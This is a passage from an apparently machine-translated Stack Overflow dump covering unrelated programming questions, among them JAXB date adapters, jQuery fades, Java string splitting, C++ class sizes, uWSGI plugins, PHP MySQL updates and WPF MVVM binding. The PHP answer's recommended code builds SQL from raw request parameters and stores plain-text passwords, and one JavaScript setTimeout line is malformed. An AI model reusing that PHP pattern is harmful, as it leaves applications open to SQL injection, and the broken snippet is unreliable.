    <jaxb:globalBindings>
        <xjc:javaType name="java.util.Date" xmlType="xsd:date" adapter="aaa.DateAdapter" />
    </jaxb:globalBindings>
</jaxb:bindings> 
```

## 更新结束

* * *

抱歉，评论太长了……

我不明白：

1.  你为什么要使用`XmlGregorianCalendar`？
2.  你为什么要`marshal`/ `unmarshal`( `serialize`/ `deserialize`) 到完全相同的数据结构？
3.  为什么要删除时区？

和

1.  我用简单直接`java.util.Date`
2.  `marshal`/`unmarshal`应该总是包含`String`s（至少对于 XML）
3.  我真的没有看到任意删除日期表示的充分理由。也许你想以绝对的方式序列化它。

然而

```
public class DateAdapter extends XmlAdapter<String, Date>
{
    @Override
    public String marshal(Date date)
    {
        DateFormat df = DateFormat.getDateTimeInstance();
        df.setTimeZone(TimeZone.getTimeZone("GMT"));

        return df.format(date);
    }

    @Override
    public Date unmarshal(String date) throws ParseException
    {
        DateFormat df = DateFormat.getDateTimeInstance();
        df.setTimeZone(TimeZone.getTimeZone("GMT"));

        return df.parse(date);
    }

    public static void main(String[] args) throws ParseException
    {
        DateAdapter adapter = new DateAdapter();

        String str = adapter.marshal(new Date());
        System.out.println(str); // 16-dic-2013 10.02.09  --> to gmt

        Date date = adapter.unmarshal(str);
        System.out.println(date); // Mon Dec 16 11:02:09 CET 2013  --> correct, i'm gmt+1
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-29T10:35:49.210

在您的情况下，您必须以不同的方式指定 java 类型：

```
<jxb:javaType 
     name="javax.xml.datatype.XMLGregorianCalendar" 
     xmlType="xs:date"  
     printMethod="foo.bar.TimezoneRemoverAdapter.marshall" 
     parseMethod="foo.bar.TimezoneRemoverAdapter.unmarshall" 
/> 
```

它对我来说很好，我用更多的适配器做了类似的事情：

```
<jaxb:globalBindings>    
     <xjc:serializable uid="12343" />
     <jaxb:javaType name="java.util.Date" xmlType="xs:date" printMethod="com.foo.DateAdapter.printDate" parseMethod="com.foo.DateAdapter.parseDate" />
     <jaxb:javaType name="java.util.Date" xmlType="xs:dateTime" printMethod="com.foo.DateAdapter.printDate" parseMethod="com.foo.DateAdapter.parseDate" />
     <jaxb:javaType name="java.util.Date" xmlType="xs:time" printMethod="com.foo.TimeAdapter.printTime" parseMethod="com.foo.TimeAdapter.parseTime" />
</jaxb:globalBindings> 
```

我将上述绑定作为一个扩展名`globalBindings`放在不同的文件中，`.xjb`并在需要它的任何地方使用它。**

# javascript - 使用 jQuery 将新的 css 应用于元素，如何添加过渡？

> ID：15936370
> 
> 赞同：0
> 
> 时间：2013-04-10T21:04:23.163
> 
> 标签：javascript, jquery, html, css

我已将此 jQuery 规则设置`.preloader`为不显示

```
$(".preloader").css("display", "none"); 
```

我如何希望它以淡出效果消失，并且在它淡出缩小时，我不知道如何做缩小效果，但我尝试应用它使其淡出

```
$(".preloader").css("display", "none").fadeOut("200"); 
```

这怎么行不通。您能否建议如何实现这两种效果？此外，解决方案会反之亦然吗？（淡入，放大到原来的大小）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:06:56.583

为了使其淡出，只需使用`fadeOut()`. 动画的结尾其实就是`display: none`给元素设置了一个a：

```
$(".preloader").fadeOut("200"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T21:06:35.063

```
$(".preloader").css("display", "none").fadeOut("200"); 
```

此代码首先隐藏 .preloader，然后尝试淡出，这是不可能的，因为它已经隐藏了。

尝试这个：

```
$(".preloader").fadeOut(200); 
```

或者

```
$(".preloader").fadeOut("fast"); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-10T21:07:34.373

`$(".preloader").toggle('hide');`并且`$(".preloader").toggle('show');`应该这样做，但`$.toggle()`如果你不关心`display`状态是什么，它本身就可以工作。

然而，

```
$(".preloader").stop(true,false).animate({
    width: 'toggle',
    height: 'toggle',
    opacity: 'toggle'
}); 
```

更酷，你只需要一个声明。你也可以使用`boolean`with `$.toggle(yourShowStateBooleanVariableGoesHere)`。

另外，我建议您使用`id`而不是`class`选择器，除非它绝对必须应用于所有`class`es（我觉得很少见）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-10T21:07:58.657

```
$(".preloader").hide().fadeIn("200");

$(".preloader").fadeOut("200"); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-10T21:08:24.600

当淡出效果完成时，它会将显示设置为无，因此您不需要 css 方法。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-10T21:10:48.800

```
$(document).ready(function(){
    $(".preloader").hover(function(){
        $(".preloader").fadeOut();
    }, function(){
         $(".preloader").fadeIn();   
    });
}); 
```

[http://jsfiddle.net/BY3tz/8/](http://jsfiddle.net/BY3tz/8/)

这应该会给你一些提示。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-04-10T21:13:42.577

如果您还想缩小，这可能是一个可能的解决方案：

```
$('.preloader').animate({width: 'toggle', height: 'toggle', opacity: 'toggle'}, 1000); 
```

使用相同的方法将其取回。

看看[小提琴](http://jsfiddle.net/BLBg9/6/)。

# css - 如何让两个 H4 标签使用不同的颜色

> ID：15936396
> 
> 赞同：2
> 
> 时间：2013-04-10T21:05:58.830
> 
> 标签：css

我正在使用以下样式：

```
h4 {
  color: #ffffff;
}

h4 .name {
color: #cf3046;
} 
```

我正在使用以下html

```
<h4 class="name">NAME</h4> 
```

NAME 没有将颜色更改为 #cf3046，但仍保持白色。我究竟做错了什么？

谢谢你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T21:06:31.603

```
h4.name {
    color: #cf3046;
} 
```

h4 和 .name 之间不应有空格，因为它们指的是同一个元素。

# hyperlink - 定时点击链接而不是定时重定向

> ID：15936403
> 
> 赞同：0
> 
> 时间：2013-04-10T21:06:11.597
> 
> 标签：hyperlink, click, timed

我需要的操作是在 1 分钟后（并且只有一次，而不是每分钟），执行链接单击，打开页面。我不能将此作为页面重定向。原因，您可以在下面看到的测试页面，要求视频背景在 1 分钟后不能重新开始，并且页面打开时会向用户提供说明。

我需要该操作与用户单击链接时相同（如果他们单击链接，则页面将打开并且背景视频不会重新开始）

[http://kartbattle.com/tester](http://kartbattle.com/tester) - 如果您单击右上角的链接，页面会打开，但视频不会重新开始......

如果您重定向到页面[http://kartbattle.com/tester/?page_id=23](http://kartbattle.com/tester/?page_id=23)视频开始，我不可能发生。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:17:26.573

使用 javascript：

```
setTimeout(function(){window.open('http://kartbattle.com/tester', '_self', '', true)}, 60000); 
```

编辑：

您仍然需要使用 javascript。首先为您的超链接添加一个 id 属性：

```
<a id="auto-click" href="http://kartbattle.com/tester/?page_id=23"> 
```

然后将以下行添加到您的 onLoad 处理程序：

```
setTimeout(document.getElementById('auto-click').click();, 60000); 
```

这应该可以实现您正在寻找的东西。

# java - 字符串输入、解析、拆分

> ID：15936405
> 
> 赞同：1
> 
> 时间：2013-04-10T21:06:20.767
> 
> 标签：java

我需要编写一个程序，让用户输入一次字符串日期（例如 10/21），然后将该字符串转换为整数。我想在解析之前需要拆分？

```
import java.util.Scanner;
public class ConvertDates {
   public static void main(String[] args) {
      Scanner input = new Scanner(System.in);
      System.out.print("Please input a date (mm/dd): ");
      String k = input.next();
      k = String.split("/");
      int mm = Integer.parseInt(k);
      int dd = Integer.parseInt(k); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-10T21:08:56.170

当你拆分一个字符串时，你不会得到一个字符串，你会得到一个字符串数组。所以你需要打电话

```
String[] k2 = k.split("/"); 
```

然后你可以得到你的月份和日期

```
int mm = Integer.parseInt(k2[0]);
int dd = Integer.parseInt(k2[1]); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-10T21:09:25.813

```
String[] tokens = k.split("/");
int mm = Integer.parseInt(tokens[0]);
int dd = Integer.parseInt(tokens[1]); 
```

由于[`split()`](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#split%28java.lang.String%29)方法返回字符串数组，因此您必须使用上面的代码。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-10T21:08:29.080

[String#split](http://docs.oracle.com/javase/7/docs/api/java/lang/String.html#split%28java.lang.String%29)返回一个`String`数组。您需要使用返回数组的元素：

```
String[] strings = k.split("/");
int mm = Integer.parseInt(strings[0]);
int dd = Integer.parseInt(strings[1]); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-10T21:13:12.720

甚至

```
 Scanner dates = new Scanner(k);
   dates.useDelimiter("/");
   int mm = dates.nextInt();
   int dd = dates.nextInt(); 
```

然后你不需要解析整数

# c++ - 我的 4 个字节去哪儿了？

> ID：15936407
> 
> 赞同：3
> 
> 时间：2013-04-10T21:06:28.530
> 
> 标签：c++

```
#include <iostream>
#include <cstdlib>

using std::cout;

class A
{

public :
    A() { cout << "A()" << this << "\n";}
    ~A() { cout << "~A()" << this << "\n";}
    //void func()  { }
    virtual void debug(int a)  { cout << "A::debug";}
private :
    int a;
};

class A1 : public A
{
public :
    A1() { cout << "A1()"<< this << "\n";}
    ~A1() { cout << "~A1()"<< this << "\n";}
private :
    int a1;
};
class A2 : public A
{
public :
    A2() { cout << "A2()"<< this << "\n";}
    ~A2() { cout << "~A2()"<< this << "\n";}
private :
    int a2;
};

class B : public A1, public A2
{
public :
    B() { cout << "B()"<< this << "\n";}
    ~B() { cout << "~B()"<< this << "\n";}
    void debug() { cout << "B::debug()";  }
private :
    int a3;
};
int main()
{
    cout << "sizeof(int)" << sizeof(int) << "\n";
    cout << "sizeof(void*)" << sizeof(void*) << "\n";
    cout << "sizeof(A): " << sizeof(A) << "\n";
    cout << "sizeof(A1): " << sizeof(A1) << "\n";
    cout << "sizeof(A2): " << sizeof(A2) << "\n";
    cout << "sizeof(B): " << sizeof(B) << "\n";
    B b;
    b.debug();

} 
```

输出 ：

```
sizeof(int)4
sizeof(void*)4
sizeof(A): 8
sizeof(A1): 12
sizeof(A2): 12
**sizeof(B): 28**
A()0x28fef4
A1()0x28fef4
**A()0x28ff00**
A2()0x28ff00
B()0x28fef4
B::debug()~B()0x28fef4
~A2()0x28ff00
~A()0x28ff00
~A1()0x28fef4
~A()0x28fef4 
```

A1 和 A2 都是 4(vtbl) + 4(A'sint) + 4(各自的 int) = 12 个字节，但 B 是 28 个字节我知道它不能保证，但是这 4 个字节的可能用途是什么......我没有看到任何填充问题？谁能指出我错过了什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-10T21:13:31.170

> `sizeof(A): 8`

该类型`A`有一个类型的成员`int`，在您的平台中是 4 个字节。它还有一个虚函数，这意味着`vptr`为您的类的每个对象分配一个（虚拟表指针），它的大小是另外 4 个字节。

> `**sizeof(B): 28**`

`B`包含一个类型的对象`A1`（12 个字节）和一个类型的对象`A2`（另外 12 个字节），并且它添加另一个`int`对象的总`12+12+4 = 28`字节数。这很简单。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T21:08:46.990

结构内数据项的机器字长对齐。

有关详细信息，请参阅结构填充。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-10T21:18:00.150

多重继承将产生可能不同大小的特定于实现的内存布局。 [用于多重虚拟继承和类型转换的虚拟表和虚拟指针](https://stackoverflow.com/questions/3324721/virtual-tables-and-virtual-pointers-for-multiple-virtual-inheritance-and-type-ca)

# ruby - watir 脚本如何打开不同文件夹中的文件？

> ID：15936409
> 
> 赞同：0
> 
> 时间：2013-04-10T21:06:33.893
> 
> 标签：ruby

我无法打开与`.txt`.rb 测试脚本所在文件夹不同的文件。我有一个不同测试类别的文件结构，然后是一个包含数据文件（如`.txt`Excel 文件）的通用文件夹。

例子：

```
Test Scripts -> Data 这是保存数据文件的地方
测试脚本 -> 主页 -> 签出 这是 .rb 测试文件所在的位置

```

我现在正在使用它来打开`.txt`文件：

```
File.open("Data/activeSites.txt") 
```

当`.rb`与文件夹位于同一文件`Data`夹中时。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T22:41:16.240

如果我正确理解您的要求，那么问题是您想要将 Ruby 脚本从 移动`TestScripts/`到`TestScripts/HomePage/Checkout/`并且不确定如何`activeSites.txt`从那里引用该文件。那是对的吗？

如果是这样，您只需要知道这`../`意味着“父目录”，因此您可以使用：

```
File.open("../../Data/activeSites.txt") 
```

第一个`../`指的是 Home Page 文件夹，然后第二个将您带到更高级别的 Test Scripts 文件夹。

# python - pip 安装的 uWSGI ./python_plugin.so 错误

> ID：15936413
> 
> 赞同：33
> 
> 时间：2013-04-10T21:06:37.710
> 
> 标签：python, uwsgi

我已经使用 pip 安装了 uWSGI 并使用 XML 启动它来加载我的应用程序。XML 配置包含`<plugin>python</plugin>`. 在我的新服务器上，它会导致错误：

```
open("./python_plugin.so"): No such file or directory [core/utils.c line 3321]
!!! UNABLE to load uWSGI plugin: ./python_plugin.so: cannot open shared object file: No such file or directory !!! 
```

我可以找到`.c`和`.o`版本：

```
sudo find / -name 'python_plugin.c'
/srv/www/li/venv/build/uwsgi/build/uwsgi/plugins/python/python_plugin.c
/srv/www/li/venv/build/uwsgi/plugins/python/python_plugin.c
sudo find / -name 'python_plugin.o'
/srv/www/li/venv/build/uwsgi/build/uwsgi/plugins/python/python_plugin.o
/srv/www/li/venv/build/uwsgi/plugins/python/python_plugin.o
sudo find / -name 'python_plugin.so' 
```

但没有.so 找到。我以前的系统通过 apt-get 安装了 uwsgi，但这真的很旧（而且我很确定它通常使用 pip 安装的 uwsgi，但可能不适用于共享对象？）

一些背景资料：

*   Ubuntu 12.0.4 LTS
*   Python 2.7（虚拟环境）
*   我已经在我的 venv 中安装了 uWSGI，使用的是普通的`pip install uwsgi`（否`sudo`）

所以我有点无能为力:(我不可能是世界上唯一拥有这个的人，对吧？我应该自己编译`.so`对象吗？（如果是，怎么做？）或者还有其他很好的解决方案吗？

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2013-05-18T00:20:50.997

对于遇到此问题的任何人，如果您从发行版包更改为 pypi 或 gem 安装，基本上您需要从配置文件中删除说明您的插件的行。我以前使用 uwsgi 的 Ubuntu/Debian 包，但它很旧，所以我升级为使用 pip。

因此，在我的配置 .ini 文件中，我有以下行：

```
plugin = python 
```

删除该行可以解决问题。

* * *

## 回答 #2

> 赞同：53
> 
> 时间：2013-04-11T05:36:55.727

发行版应该以模块化的方式打包 uWSGI，每个特性都作为一个插件。但是当您使用特定语言的方式（pip，gem ...）安装时，相关语言是嵌入的，因此您不需要加载插件

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2016-05-30T11:32:55.947

也许你忘记了这个命令

```
$ apt-get install uwsgi-plugin-python 
```

如果您使用的是 Python3，请尝试以下命令：

```
$ apt-get install uwsgi-plugin-python3 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-09-05T09:52:45.600

安装所有可用的插件：`sudo apt-get install uwsgi-plugins-all`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-05-21T21:43:58.207

自 2018 年 6 月起，`yum`软件包名称已更新`uwsgi-plugin-python`为`uwsgi-plugin-python2` [https://src.fedoraproject.org/rpms/uwsgi/pull-request/4#](https://src.fedoraproject.org/rpms/uwsgi/pull-request/4#)

因此，新的安装命令是`yum install uwsgi-plugin-python2`

# php - 在PHP中从数据库中删除一行

> ID：15936420
> 
> 赞同：-1
> 
> 时间：2013-04-10T21:07:07.770
> 
> 标签：php, database

我想从 MySQL 数据库中删除一行，但我无法执行此操作，尽管我可以更新该行。第一部分是更新代码，第二部分是删除代码。

有趣的是，它向我显示了成功删除的警报，但实际上在 MySQL 数据库中没有任何改变。

```
<?php
// for updating Check if button name "Submit" is active, do this 
if(isset($_POST['Submit']) && $_POST['Submit'] == 'update')
  {
$sql1=mysql_query(" UPDATE `".$tbl_name."` SET  `username`='".$_REQUEST['user']."' , `password`='".$_REQUEST['pass']."' , `name`='".$_REQUEST['name']."' , `lastname`='".$_REQUEST['lastname']."' , `phone`='".$_REQUEST['phone']."' , `state`='".$_REQUEST['state']."' , `details`='".$_REQUEST['details']."'  WHERE `id`='".$_REQUEST['id']."' ");
$result1=mysql_query($sql1);
  }

if(isset($result1)){
?>
<script language="javascript">alert('successfuly updated');</script>
<?php
print(redirect('editteacher.php'));
}
  mysql_close();

?>

<?php
//for deleting Check if button name "Submit" is active, do this 
  if(isset($_POST['delete']) && $_POST['delete'] == 'delete user')
  {
$sql1=" DELETE FROM `".$tbl_name."` WHERE `username`='789' ";

$result1=mysql_query($sql1);

if(isset($result1)){
?>
<script language="javascript">alert('successfuly deleted');</script>
<?php

print(redirect('editteacher.php'));
  }
}
mysql_close();

?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:16:54.100

替换此行

```
$result1=mysql_query($sql1); 
```

经过

```
$result1=mysql_query($sql1) or die(mysql_error()); 
```

这将向您显示代码的任何错误。

总的来说，我建议改进您的代码：

```
$html = "";
$redirectTo = "";

// for updating Check if button name "Submit" is active, do this 
if(isset($_POST['Submit']) && $_POST['Submit'] == 'update')
{
  $q = " UPDATE `".$tbl_name."` SET  `username`='".$_REQUEST['user']."' , `password`='".$_REQUEST['pass']."' , `name`='".$_REQUEST['name']."' , `lastname`='".$_REQUEST['lastname']."' , `phone`='".$_REQUEST['phone']."' , `state`='".$_REQUEST['state']."' , `details`='".$_REQUEST['details']."'  WHERE `id`='".$_REQUEST['id']."' ";
  $sql1 = mysql_query($q);
  $result1 = mysql_query($sql1) or die(mysql_error());

  if($result1){
    $html = "<script language=\"javascript\">alert(\"successfuly updated\");</script>";
    $redirectTo = "editteacher.php";
    //not sure what you are trying to do here?
    //print(redirect('editteacher.php'));
  }
}
//for deleting Check if button name "Submit" is active, do this 
elseif(isset($_POST['delete']) && $_POST['delete'] == 'delete user')
{
  $q = " DELETE FROM `".$tbl_name."` WHERE `username`='".$_REQUEST['user']."' ";
  $sql1=mysql_query($q);
  $result1=mysql_query($sql1);

  if($result1){
    $html = "<script language=\"javascript\">alert(\"successfuly deleted\");</script>";
    $redirectTo = "editteacher.php";
    //not sure what you are trying to do here?
    // print(redirect('editteacher.php'));
  }
}

echo $html;
if($redirectTo){
  print(redirect($redirectTo));
}
mysql_close(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:13:56.757

1.  删除双重查询

    更改 `$sql1=mysql_query(" UPDATE` “.$tbl_name”。 `to`$sql1=" UPDATE `".$tbl_name." 因为你有双重查询。

# html - 可更新的页面标题 Adob e Business Catalyst

> ID：15936421
> 
> 赞同：0
> 
> 时间：2013-04-10T21:07:07.380
> 
> 标签：html, templates, business-catalyst

看[这里](http://livingwood.businesscatalyst.com/index)。我想更新 BC 页面标题标签，以便它更新并在每个页面上显示正确的页面标题。现在它在网站模板中，需要保留在那里以便于客户编辑。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-01T18:20:39.040

`{tag_pagetitle}` 显示当前页面标题。必须在模板的标题标签中使用。

例如。

```
<!-- TemplateBeginEditable name="doctitle" -->
    <title>{tag_pagetitle}</title>
<!-- TemplateEndEditable --> 
```

# c# - SpecFlow - Visual Studio 的 HTML 输出

> ID：15936424
> 
> 赞同：3
> 
> 时间：2013-04-10T21:07:12.710
> 
> 标签：c#, nunit, specflow

我正在尝试从 Visual Studio 为我的 specflow 功能生成一个不错的 HTML 输出。我安装了 resharper，我可以运行我的功能测试，但我想获得最终结果的 html 输出。

我试过几个网站说我们可以创建一个外部工具。这是我的设置：

```
Title: SpecFlow Test Result

Command:C:\TFS\Test_Automation\a.1_Main\Test\AutoUpdateTests\AutoUpdateTests\packages\SpecFlow.1.9.0\tools\specflow.exe

Arguments: nunitexecutionreport AutoUpdateTests.csproj /xmlTestResult:bin\debug\TestResult.xml

Initial directory: $(ProjectDir) 
```

所以然后我执行我的测试，然后选择 Tools -> SpecFlow Test Result

我看到一个 cmd 窗口短暂打开，但没有出现 TestResult.xml 文件。

有任何想法吗？我还在我的项目中引用了 nunit.framework 不确定这是否重要。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T09:06:03.657

我写了[一篇博客文章](http://www.marcusoft.net/2010/12/specflowexe-and-mstest.html)，描述了这是如何完成的，是的，它是关于 MsTest 但总体思路是一样的

另外 - 在[本视频](http://www.youtube.com/watch?v=SVwBz-ZTliw)的最后 2 分钟， Rob Conery 将 Visual Studio 与 SpecFlow 测试运行程序挂钩，如果您宁愿观看而不是阅读。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-11T15:27:19.587

如果您对格式不挑剔，那么还有另一种方法可以实现这一点，

1.  [下载TeamCity](http://www.jetbrains.com/teamcity/download/index.html)的免费副本（存在其他 CI 服务器）
2.  添加一个 Visual Studio 构建步骤来构建您的项目
3.  添加一个 nUnit 构建步骤来运行你的测试
4.  查看构建日志

> [x.Tests.dll] x.Tests.ConfirmThatSchedulesStartAndStopFeature.ProvideAFakeDateTime_Now
> 
> 给定一个名为 Calc 的时间表
> 
> -> 完成：ScheduleModelTest.GivenAScheduleCalled("Calc") (0.0s)
> 
> 我的日程安排认为是星期一 8:00
> 
> -> 完成：ScheduleModelTest.GivenMyScheduleThinksIts("Monday", "8:00") (0.0s)
> 
> 然后我的日程应该告诉我它是星期一 8:00
> 
> -> 完成：ScheduleModelTest.ThenMyScheduleShouldTellMeIts("Monday", "8:00") (0.0s)

# c# - 为动态内容绑定 ContentControl Content

> ID：15936428
> 
> 赞同：32
> 
> 时间：2013-04-10T21:07:21.050
> 
> 标签：c#, wpf, xaml, binding, contentcontrol

我目前正在尝试通过使用 ListView（作为选项卡）和绑定 Content 属性的 ContentControl 来实现具有隐藏选项卡的选项卡控件的功能。

我读了一些关于该主题的内容，如果我做对了，它应该这样工作：

```
<Grid>
    <Grid.ColumnDefinitions>
        <ColumnDefinition Width="20.0*"/>
        <ColumnDefinition Width="80.0*"/>
    </Grid.ColumnDefinitions>
    <ListBox Grid.Column="0">
        <ListBoxItem Content="Appearance"/>
    </ListBox>

    <ContentControl Content="{Binding SettingsPage}" Grid.Column="1"/>
</Grid>
.
.
<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
                xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
    <ContentControl x:Key="AppearancePage">
        <TextBlock Text="Test" />
    </ContentControl>
    <ContentControl x:Key="AdvancedPage">
        <TextBlock Text="Test2" />
    </ContentControl>
</ResourceDictionary> 
```

在后面的代码中：

```
public partial class MainWindow : MetroWindow
  {
    private ContentControl SettingsPage;
    private ResourceDictionary SettingsPagesDict = new ResourceDictionary();

    public MainWindow()
    {
        InitializeComponent();

        SettingsPagesDict.Source = new Uri("SettingsPages.xaml", UriKind.RelativeOrAbsolute);
        SettingsPage = SettingsPagesDict["AppearancePage"] as ContentControl; 
```

尽管它不会引发错误，但它不会显示“测试”文本块。

可能我对绑定的概念有误，请给我一个正确方向的提示。

问候

* * *

## 回答 #1

> 赞同：87
> 
> 时间：2013-04-11T23:52:46.660

Ok I've knocked up a simple example to show you how you can dynamically change the content of the ContentControl using a MVVM(Model-View-ViewModel) approach with data binding.

I would recommend that you create a new project and load these files to see how it all works.

We first need to implement INotifyPropertyChanged interface. This will allow you to define your own classes with properties that will notify the UI when a change to the properties occurs. We create an abstract class that provides this functionality.

**ViewModelBase.cs**

```
public abstract class ViewModelBase : INotifyPropertyChanged
{
    public event PropertyChangedEventHandler PropertyChanged;

    protected void OnPropertyChanged(string propertyName)
    {
        this.OnPropertyChanged(new PropertyChangedEventArgs(propertyName));
    }

    protected virtual void OnPropertyChanged(PropertyChangedEventArgs e)
    {
        var handler = this.PropertyChanged;
        if (handler != null)
        {
            handler(this, e);
        }
    }
} 
```

We now need to have the data models. For simplicity, I've created 2 models - HomePage and SettingsPage. Both models only have a single property, you can add more properties as required.

**HomePage.cs**

```
public class HomePage
{
    public string PageTitle { get; set; }
} 
```

**SettingsPage.cs**

```
public class SettingsPage
{
    public string PageTitle { get; set; }
} 
```

I then create corresponding ViewModels to wrap each model. Note that the viewmodels inherit from my ViewModelBase abstract class.

**HomePageViewModel.cs**

```
public class HomePageViewModel : ViewModelBase
{
    public HomePageViewModel(HomePage model)
    {
        this.Model = model;
    }

    public HomePage Model { get; private set; }

    public string PageTitle
    {
        get
        {
            return this.Model.PageTitle;
        }
        set
        {
            this.Model.PageTitle = value;
            this.OnPropertyChanged("PageTitle");
        }
    }
} 
```

**SettingsPageViewModel.cs**

```
public class SettingsPageViewModel : ViewModelBase
{
    public SettingsPageViewModel(SettingsPage model)
    {
        this.Model = model;
    }

    public SettingsPage Model { get; private set; }

    public string PageTitle
    {
        get
        {
            return this.Model.PageTitle;
        }
        set
        {
            this.Model.PageTitle = value;
            this.OnPropertyChanged("PageTitle");
        }
    }
} 
```

Now we need to provide Views for each ViewModel. i.e. The HomePageView and the SettingsPageView. I created 2 UserControls for this.

**HomePageView.xaml**

```
<UserControl x:Class="WpfApplication3.HomePageView"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
         xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
         xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
         mc:Ignorable="d" 
         d:DesignHeight="300" d:DesignWidth="300">
<Grid>
        <TextBlock FontSize="20" Text="{Binding Path=PageTitle}" />
</Grid> 
```

**SettingsPageView.xaml**

```
<UserControl x:Class="WpfApplication3.SettingsPageView"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
         xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
         xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
         mc:Ignorable="d" 
         d:DesignHeight="300" d:DesignWidth="300">
<Grid>
    <TextBlock FontSize="20" Text="{Binding Path=PageTitle}" />
</Grid> 
```

We now need to define the xaml for the MainWindow. I have included 2 buttons to help navigate between the 2 "pages". **MainWindow.xaml**

```
<Window x:Class="WpfApplication3.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
    xmlns:local="clr-namespace:WpfApplication3"
    Title="MainWindow" Height="350" Width="525">
<Window.Resources>
    <DataTemplate DataType="{x:Type local:HomePageViewModel}">
        <local:HomePageView />
    </DataTemplate>
    <DataTemplate DataType="{x:Type local:SettingsPageViewModel}">
        <local:SettingsPageView />
    </DataTemplate>
</Window.Resources>
<DockPanel>
    <StackPanel DockPanel.Dock="Left">
        <Button Content="Home Page" Command="{Binding Path=LoadHomePageCommand}" />
        <Button Content="Settings Page" Command="{Binding Path=LoadSettingsPageCommand}"/>
    </StackPanel>

    <ContentControl Content="{Binding Path=CurrentViewModel}"></ContentControl>
</DockPanel> 
```

We also need a ViewModel for the MainWindow. But before that we need create another class so that we can bind our Buttons to Commands.

**DelegateCommand.cs**

```
public class DelegateCommand : ICommand
{
    /// <summary>
    /// Action to be performed when this command is executed
    /// </summary>
    private Action<object> executionAction;

    /// <summary>
    /// Predicate to determine if the command is valid for execution
    /// </summary>
    private Predicate<object> canExecutePredicate;

    /// <summary>
    /// Initializes a new instance of the DelegateCommand class.
    /// The command will always be valid for execution.
    /// </summary>
    /// <param name="execute">The delegate to call on execution</param>
    public DelegateCommand(Action<object> execute)
        : this(execute, null)
    {
    }

    /// <summary>
    /// Initializes a new instance of the DelegateCommand class.
    /// </summary>
    /// <param name="execute">The delegate to call on execution</param>
    /// <param name="canExecute">The predicate to determine if command is valid for execution</param>
    public DelegateCommand(Action<object> execute, Predicate<object> canExecute)
    {
        if (execute == null)
        {
            throw new ArgumentNullException("execute");
        }

        this.executionAction = execute;
        this.canExecutePredicate = canExecute;
    }

    /// <summary>
    /// Raised when CanExecute is changed
    /// </summary>
    public event EventHandler CanExecuteChanged
    {
        add { CommandManager.RequerySuggested += value; }
        remove { CommandManager.RequerySuggested -= value; }
    }

    /// <summary>
    /// Executes the delegate backing this DelegateCommand
    /// </summary>
    /// <param name="parameter">parameter to pass to predicate</param>
    /// <returns>True if command is valid for execution</returns>
    public bool CanExecute(object parameter)
    {
        return this.canExecutePredicate == null ? true : this.canExecutePredicate(parameter);
    }

    /// <summary>
    /// Executes the delegate backing this DelegateCommand
    /// </summary>
    /// <param name="parameter">parameter to pass to delegate</param>
    /// <exception cref="InvalidOperationException">Thrown if CanExecute returns false</exception>
    public void Execute(object parameter)
    {
        if (!this.CanExecute(parameter))
        {
            throw new InvalidOperationException("The command is not valid for execution, check the CanExecute method before attempting to execute.");
        }
        this.executionAction(parameter);
    }
} 
```

And now we can defind the MainWindowViewModel. CurrentViewModel is the property that is bound to the ContentControl on the MainWindow. When we change this property by clicking on the buttons, the screen changes on the MainWindow. The MainWindow knows which screen(usercontrol) to load because of the DataTemplates that I have defined in the Window.Resources section.

**MainWindowViewModel.cs**

```
public class MainWindowViewModel : ViewModelBase
{
    public MainWindowViewModel()
    {
        this.LoadHomePage();

        // Hook up Commands to associated methods
        this.LoadHomePageCommand = new DelegateCommand(o => this.LoadHomePage());
        this.LoadSettingsPageCommand = new DelegateCommand(o => this.LoadSettingsPage());
    }

    public ICommand LoadHomePageCommand { get; private set; }
    public ICommand LoadSettingsPageCommand { get; private set; }

    // ViewModel that is currently bound to the ContentControl
    private ViewModelBase _currentViewModel;

    public ViewModelBase CurrentViewModel
    {
        get { return _currentViewModel; }
        set
        {
            _currentViewModel = value; 
            this.OnPropertyChanged("CurrentViewModel");
        }
    }

    private void LoadHomePage()
    {
        CurrentViewModel = new HomePageViewModel(
